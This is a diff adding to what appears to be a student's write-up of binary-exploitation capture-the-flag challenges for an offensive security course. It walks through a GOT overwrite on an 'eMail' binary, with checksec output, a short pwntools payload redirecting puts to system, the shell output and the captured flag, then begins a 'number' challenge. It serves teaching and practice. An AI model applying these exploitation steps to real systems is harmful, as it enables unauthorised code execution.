@@ -259,4 +259,111 @@ $ cat flag.txt
 flag{y0u_r3_gonna_be_us1ng_gl1bc_4_l0t!_e116054913869f5f}
 ```
 
+## Challenge - eMail
+```aiignore
+I created a super secure eMail service. Go ahead and send a message!
 
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1295
+```
+```aiignore
+$ pwn checksec --file=email
+[*] '/mnt/csgy9223_IntroOffSec/week_6/email'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+Running the binary:
+```aiignore
+$ ./email
+        Fri Mar 14 10:29:12 EDT 2025
+        Welcome to my Simple eMail Service!
+
+        To: n
+        Subject: ctf
+        Message: here we go
+
+
+        sending ...
+
+here we go
+```
+Lets look under the covers with binja. After reviewing the binary, My current assumption is that this exploit involves updated the address to puts() to point to system() and allow the message buffer that was input to start with "/bin/sh" followed by a null. There is something weird going on with the main() function in that the RBP keeps getting reassigned into the stack. My guess there is a way to exploit this to change the address of the puts() function in the send() function which has 2 arguments passed in and performs an assignment.
+
+The pointer passed in as the 2nd argument is assigned the value of the first argument. I'll start with a solver script to help me walk through a gdb session with the ability to inject data.
+
+After some debugging, it looks like the rbp is updated to the point where the first read (To:), I'll call the "receiver" is used by into send() function. The first 8 bytes should be the address of system() and the second address should be the address of puts(). Let's give it a try...
+
+So it took me a while, but I finally figure out what addresses to send in. The send() function replaces the value of the 2nd 8 bytes of the To: entry with the first 8 bytes.
+
+I sent in the first 8 bytes to be the PLT address of system, then set the 2nd 8 bytes to be the address of the GOT for puts.
+
+```aiignore
+puts GOT address: 0x404020
+system PLT address: 0x4010e4
+
+p.recvuntil(b'To: ')
+p.send(p64(system_plt_address) + p64(puts_got_address))
+```
+And the results are:
+
+```aiignore
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0xf bytes:
+    b'email\n'
+    b'flag.txt\n'
+email
+flag.txt
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x43 bytes:
+    b'flag{0v3rwr1t1ng_3ntr1es_1n_th3_G0T_f0r_th3_W1n!_de5b89bdbfa547a0}\n'
+flag{0v3rwr1t1ng_3ntr1es_1n_th3_G0T_f0r_th3_W1n!_de5b89bdbfa547a0}
+```
+
+
+Challenge - number
+```aiignore
+number
+150
+That gets function is too dangerous, I won't use it anymore!
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1291
+```
+Inspecting:
+```aiignore
+$ pwn checksec --file=number
+[*] '/mnt/csgy9223_IntroOffSec/week_6/number'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+Running the binary:
+```aiignore
+$ ./number
+
+I wrote my phone number here: 0x7ffd98e142c8
+
+Can you read it?
+> 8675309
+
+1337 number isn't it
+> 999
+
+Your answer was: 999
+```
+Let's look further using binja.
